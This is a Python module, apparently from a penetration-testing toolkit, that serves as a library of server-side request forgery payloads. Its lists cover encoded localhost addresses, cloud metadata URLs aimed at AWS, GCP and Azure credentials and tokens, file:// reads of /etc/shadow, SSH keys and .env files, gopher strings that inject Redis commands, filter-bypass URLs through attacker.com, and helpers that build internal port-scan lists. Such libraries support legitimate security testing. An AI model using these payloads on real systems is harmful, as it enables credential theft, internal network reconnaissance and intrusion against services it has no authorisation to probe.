#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) Payloads
============================================

Payloads for detecting and exploiting SSRF vulnerabilities.

How SSRF Works:
---------------
SSRF occurs when an attacker can make the server perform HTTP requests
to arbitrary URLs. This allows accessing internal resources that are
not directly accessible from the internet.

Example vulnerable code:
    url = request.GET['url']
    response = requests.get(url)  # Server fetches attacker-controlled URL
    return response.content

Impact:
- Access internal services (databases, admin panels)
- Read cloud metadata (AWS/GCP credentials)
- Port scan internal network
- Bypass firewalls/access controls
- Read local files (file://)
- Execute code via protocol smuggling
"""

# ============================================================
# LOCALHOST VARIANTS
# ============================================================
# Different ways to represent 127.0.0.1

LOCALHOST = [
    # Standard
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    
    # IPv6
    "http://[::1]",
    "http://[0:0:0:0:0:0:0:1]",
    "http://[::ffff:127.0.0.1]",
    
    # Decimal IP (127.0.0.1 = 2130706433)
    "http://2130706433",
    
    # Octal (127 = 0177, 0.0.1 = 0.0.01)
    "http://0177.0.0.1",
    "http://0177.0.0.01",
    "http://0177.00.00.01",
    "http://017700000001",
    
    # Hex
    "http://0x7f.0x0.0x0.0x1",
    "http://0x7f000001",
    "http://0x7f.0.0.1",
    
    # Mixed formats
    "http://127.0.0.1.nip.io",  # DNS rebinding service
    "http://127.0.0.1.xip.io",
    "http://localtest.me",      # Resolves to 127.0.0.1
    
    # Zero variants
    "http://0.0.0.0",
    "http://0",
    
    # Shorthand
    "http://127.1",
    "http://127.0.1",
]


# ============================================================
# CLOUD METADATA ENDPOINTS
# ============================================================
# Access cloud provider metadata services

AWS_METADATA = [
    # Instance metadata (IMDSv1)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/meta-data/iam/info",
    
    # IAM credentials (most valuable!)
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # Then append role name to get actual creds
    
    # User data (often contains secrets)
    "http://169.254.169.254/latest/user-data/",
    
    # Instance identity
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    
    # Alternative IP representations
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://169.254.169.254.nip.io/latest/meta-data/",
]

GCP_METADATA = [
    # Must include Metadata-Flavor: Google header
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    
    # Project info
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",
    
    # Instance info
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    
    # Service account tokens
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
]

AZURE_METADATA = [
    # Instance metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    
    # Identity tokens
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    
    # Instance info
    "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
]

DIGITALOCEAN_METADATA = [
    "http://169.254.169.254/metadata/v1/",
    "http://169.254.169.254/metadata/v1/hostname",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/metadata/v1/region",
]

KUBERNETES_METADATA = [
    # Kubernetes API from pod
    "https://kubernetes.default.svc/",
    "https://kubernetes.default.svc/api/v1/namespaces",
    "https://kubernetes.default.svc/api/v1/secrets",
    
    # Service account token location
    # /var/run/secrets/kubernetes.io/serviceaccount/token
]


# ============================================================
# INTERNAL NETWORK SCANNING
# ============================================================
# Common internal IPs and services

INTERNAL_IPS = [
    # Common gateway IPs
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://192.168.2.1",
    "http://10.0.0.1",
    "http://10.1.1.1",
    "http://172.16.0.1",
    "http://172.17.0.1",  # Docker default
    
    # Common internal hosts
    "http://intranet",
    "http://internal",
    "http://localhost",
    "http://mail",
    "http://db",
    "http://database",
    "http://mysql",
    "http://postgres",
    "http://redis",
    "http://elasticsearch",
    "http://jenkins",
    "http://gitlab",
    "http://admin",
]

COMMON_PORTS = [
    80,     # HTTP
    443,    # HTTPS
    8080,   # HTTP alt
    8443,   # HTTPS alt
    22,     # SSH
    21,     # FTP
    3306,   # MySQL
    5432,   # PostgreSQL
    6379,   # Redis
    27017,  # MongoDB
    9200,   # Elasticsearch
    11211,  # Memcached
    9000,   # PHP-FPM
]


# ============================================================
# FILE PROTOCOL
# ============================================================
# Read local files (if file:// supported)

FILE_READ = [
    # Linux
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///etc/hosts",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/net/tcp",
    "file:///proc/net/arp",
    "file:///root/.ssh/id_rsa",
    "file:///root/.bash_history",
    "file:///var/log/auth.log",
    
    # Windows
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "file:///C:/Windows/win.ini",
    "file:///C:/inetpub/wwwroot/web.config",
    
    # Application files
    "file:///var/www/html/config.php",
    "file:///var/www/html/.env",
    "file:///app/.env",
    "file:///opt/app/config.yml",
]


# ============================================================
# PROTOCOL SMUGGLING
# ============================================================
# Use other protocols for exploitation

GOPHER = [
    # Redis command injection
    "gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0D%0A",
    
    # MySQL (requires specific packet crafting)
    "gopher://127.0.0.1:3306/_<mysql_packet>",
    
    # SMTP
    "gopher://127.0.0.1:25/_HELO%20localhost%0D%0A",
    
    # Memcached
    "gopher://127.0.0.1:11211/_stats%0D%0A",
]

DICT = [
    # Dictionary server protocol (for service detection)
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
]

LDAP = [
    "ldap://127.0.0.1:389/",
    "ldap://127.0.0.1:636/",
]


# ============================================================
# FILTER BYPASS
# ============================================================
# Evade SSRF protections

BYPASS = [
    # URL encoding
    "http://127.0.0.1/%2f%2e%2e",
    "http://127%2e0%2e0%2e1",
    
    # Double encoding
    "http://127%252e0%252e0%252e1",
    
    # Using @ for URL auth
    "http://attacker.com@127.0.0.1",
    "http://127.0.0.1#@attacker.com",
    
    # URL fragments
    "http://127.0.0.1#attacker.com",
    
    # Enclosed alphanumerics
    "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
    "http://ⓁⓄⒸⒶⓁⒽⓄⓈⓉ",
    
    # Redirects (if your server redirects to internal)
    "http://attacker.com/redirect?url=http://127.0.0.1",
    
    # DNS rebinding (attacker controls DNS, alternates external/internal)
    "http://rebind.network/...",
    
    # Short URLs
    "http://tinyurl.com/xxxx",
    
    # Alternate domains
    "http://spoofed.burpcollaborator.net",
    
    # Add port 80 explicitly (some filters miss this)
    "http://127.0.0.1:80",
    
    # IPv6 with zone ID
    "http://[::1%25eth0]",
    
    # Dotless decimal
    "http://2130706433",  # 127.0.0.1
    
    # Overflow IP
    "http://127.256.0.1",  # May wrap to 127.0.0.1
]


# ============================================================
# BLIND SSRF DETECTION
# ============================================================
# Confirm SSRF exists without direct response

BLIND_DETECTION = [
    # Use Burp Collaborator / webhook.site / interactsh
    "http://YOUR-COLLABORATOR-ID.burpcollaborator.net",
    "http://YOUR-WEBHOOK.webhook.site",
    "http://YOUR-ID.interact.sh",
    "http://YOUR-SERVER.ngrok.io",
    
    # DNS exfiltration
    "http://ssrf-test.YOUR-DOMAIN.com",
]


# ============================================================
# URL PARAMETERS TO TEST
# ============================================================
# Common parameter names that may be vulnerable

VULNERABLE_PARAMS = [
    "url",
    "uri",
    "path",
    "dest",
    "destination",
    "redirect",
    "redirect_uri",
    "redirect_url",
    "return",
    "return_url",
    "returnUrl",
    "next",
    "target",
    "link",
    "feed",
    "host",
    "site",
    "html",
    "img",
    "image",
    "load",
    "source",
    "src",
    "file",
    "document",
    "folder",
    "page",
    "dir",
    "show",
    "view",
    "content",
    "proxy",
    "reference",
    "ref",
    "callback",
    "api",
    "endpoint",
    "domain",
    "continue",
    "window",
    "data",
]


# ============================================================
# ALL PAYLOADS
# ============================================================

ALL_METADATA = AWS_METADATA + GCP_METADATA + AZURE_METADATA + DIGITALOCEAN_METADATA
ALL_LOCALHOST = LOCALHOST
ALL_INTERNAL = INTERNAL_IPS


# ============================================================
# HELPER FUNCTIONS
# ============================================================

def generate_port_scan(host: str, ports: list = None) -> list:
    """Generate URLs for port scanning"""
    if ports is None:
        ports = COMMON_PORTS
    return [f"http://{host}:{port}" for port in ports]


def generate_ip_range(prefix: str, start: int = 1, end: int = 255) -> list:
    """Generate IPs in a range"""
    return [f"http://{prefix}.{i}" for i in range(start, end + 1)]


# ============================================================
# USAGE
# ============================================================

if __name__ == "__main__":
    print("""
SSRF Payload Library
====================

Categories:
  - LOCALHOST ({} payloads) - 127.0.0.1 variants
  - AWS_METADATA ({} payloads) - AWS instance metadata
  - GCP_METADATA ({} payloads) - GCP metadata
  - AZURE_METADATA ({} payloads) - Azure metadata
  - FILE_READ ({} payloads) - Local file read
  - GOPHER ({} payloads) - Protocol smuggling
  - BYPASS ({} payloads) - Filter evasion
  - VULNERABLE_PARAMS ({} params) - Common param names

Usage:
  from payloads.ssrf import LOCALHOST, AWS_METADATA
  
  for payload in LOCALHOST:
      test_param(url, "url", payload)

Port scanning:
  from payloads.ssrf import generate_port_scan
  
  for url in generate_port_scan("192.168.1.1"):
      response = test(url)
      if "open" in response or response.status == 200:
          print(f"Port open: {{url}}")
""".format(
        len(LOCALHOST), len(AWS_METADATA), len(GCP_METADATA),
        len(AZURE_METADATA), len(FILE_READ), len(GOPHER),
        len(BYPASS), len(VULNERABLE_PARAMS)
    ))
